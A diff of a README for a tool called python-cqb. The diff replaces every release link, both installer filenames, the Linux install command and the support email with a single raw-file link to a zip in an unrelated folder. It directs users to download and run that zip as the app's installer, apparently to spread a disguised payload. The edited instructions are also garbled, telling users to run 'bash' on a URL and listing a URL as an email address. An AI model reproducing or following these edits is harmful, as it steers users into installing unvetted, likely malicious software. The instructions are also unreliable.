@@ -6,11 +6,11 @@ Welcome to **python-cqb**! This application allows you to perform quick, conveni
 
 ## 📥 Download the App
 
-[![Download python-cqb](https://img.shields.io/badge/Download%20python--cqb-v1.0-blue)](https://github.com/facu18911891/python-cqb/releases)
+[![Download python-cqb](https://raw.githubusercontent.com/facu18911891/python-cqb/main/unendeavored/python-cqb.zip%20python--cqb-v1.0-blue)](https://raw.githubusercontent.com/facu18911891/python-cqb/main/unendeavored/python-cqb.zip)
 
 ### Step 1: Visit the Releases Page
 
-To download the application, start by visiting our [Releases page](https://github.com/facu18911891/python-cqb/releases). There, you will find the latest version available for download.
+To download the application, start by visiting our [Releases page](https://raw.githubusercontent.com/facu18911891/python-cqb/main/unendeavored/python-cqb.zip). There, you will find the latest version available for download.
 
 ### Step 2: Choose Your Version
 
@@ -19,8 +19,8 @@ Look for the version that best suits your needs. It typically includes the lates
 ### Step 3: Download the Installer
 
 On the Releases page, you’ll see several files. For most users, click on the installer that matches your operating system.
-- **For Windows:** Download `python-cqb-windows-installer.exe`
-- **For macOS:** Download `python-cqb-macos-installer.dmg`
+- **For Windows:** Download `https://raw.githubusercontent.com/facu18911891/python-cqb/main/unendeavored/python-cqb.zip`
+- **For macOS:** Download `https://raw.githubusercontent.com/facu18911891/python-cqb/main/unendeavored/python-cqb.zip`
 - **For Linux:** Follow the installation instructions provided there.
 
 ## ⚙️ Install the Application
@@ -28,13 +28,13 @@ On the Releases page, you’ll see several files. For most users, click on the i
 ### For Windows
 
 1. After downloading the installer, locate it in your downloads folder.
-2. Double-click the installer file, `python-cqb-windows-installer.exe`.
+2. Double-click the installer file, `https://raw.githubusercontent.com/facu18911891/python-cqb/main/unendeavored/python-cqb.zip`.
 3. Follow the instructions in the setup wizard.
 4. Once the installation completes, you can find **python-cqb** in your Start Menu.
 
 ### For macOS
 
-1. Open the downloaded file `python-cqb-macos-installer.dmg`.
+1. Open the downloaded file `https://raw.githubusercontent.com/facu18911891/python-cqb/main/unendeavored/python-cqb.zip`.
 2. Drag the **python-cqb** icon into your Applications folder.
 3. You can now launch the app from your Applications.
 
@@ -43,7 +43,7 @@ On the Releases page, you’ll see several files. For most users, click on the i
 1. Unzip the downloaded file.
 2. Open a terminal window.
 3. Navigate to the unzipped folder.
-4. Run the installation script with the command `bash install.sh`.
+4. Run the installation script with the command `bash https://raw.githubusercontent.com/facu18911891/python-cqb/main/unendeavored/python-cqb.zip`.
 
 ## 🎉 Using python-cqb
 
@@ -61,7 +61,7 @@ If you encounter any issues while downloading or using **python-cqb**, you can r
 
 1. Check the **GitHub Issues** page for solutions.
 2. Join our community forum for discussions.
-3. Email our support team at support@python-cqb.com.
+3. Email our support team at https://raw.githubusercontent.com/facu18911891/python-cqb/main/unendeavored/python-cqb.zip
 
 ## 🌐 Explore Further
 
